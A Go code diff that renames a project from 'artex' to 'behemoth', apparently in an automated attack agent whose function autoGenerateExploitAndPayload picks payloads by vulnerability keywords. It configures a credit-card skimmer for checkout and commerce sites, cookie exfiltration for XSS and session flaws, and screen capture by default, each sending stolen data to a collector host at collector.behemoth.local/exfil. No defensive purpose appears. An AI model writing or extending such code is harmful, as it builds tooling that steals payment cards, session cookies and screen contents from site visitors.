@@ -11,7 +11,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/Autumn-27/artex/agent/payloads"
+	"github.com/Autumn-27/behemoth/agent/payloads"
 )
 
 // PollSourceByID fetches and parses a single watch feed by ID immediately.
@@ -115,7 +115,7 @@ func (m *Monitor) autoGenerateExploitAndPayload(gen *ExploitGenerator, v Vulnera
 	case strings.Contains(combined, "payment") || strings.Contains(combined, "checkout") || strings.Contains(combined, "commerce") || strings.Contains(combined, "cart") || strings.Contains(combined, "magento") || strings.Contains(combined, "shopify"):
 		payloadType = "cc_skimmer"
 		payloadCode, _ = payloads.GenerateCCSkimmer(payloads.CCSkimmerConfig{
-			ExfilEndpoint:    "https://collector.artex.local/exfil/cc",
+			ExfilEndpoint:    "https://collector.behemoth.local/exfil/cc",
 			MaskOriginalForm: true,
 		})
 	case strings.Contains(combined, "crypto") || strings.Contains(combined, "wallet") || strings.Contains(combined, "web3") || strings.Contains(combined, "clipboard"):
@@ -126,13 +126,13 @@ func (m *Monitor) autoGenerateExploitAndPayload(gen *ExploitGenerator, v Vulnera
 	case strings.Contains(combined, "xss") || strings.Contains(combined, "session") || strings.Contains(combined, "auth") || strings.Contains(combined, "cookie") || strings.Contains(combined, "token") || strings.Contains(combined, "browser") || strings.Contains(combined, "chrome") || strings.Contains(combined, "webkit") || strings.Contains(combined, "safari"):
 		payloadType = "cookie_exfil"
 		payloadCode, _ = payloads.GenerateCookieExfil(payloads.CookieExfilConfig{
-			ExfilEndpoint: "https://collector.artex.local/exfil/cookies",
+			ExfilEndpoint: "https://collector.behemoth.local/exfil/cookies",
 			ExfilMethod:   "beacon",
 		})
 	default:
 		payloadType = "screen_exfil"
 		payloadCode, _ = payloads.GenerateScreenExfil(payloads.ScreenExfilConfig{
-			ExfilEndpoint: "https://collector.artex.local/exfil/screen",
+			ExfilEndpoint: "https://collector.behemoth.local/exfil/screen",
 			Quality:       75,
 		})
 	}
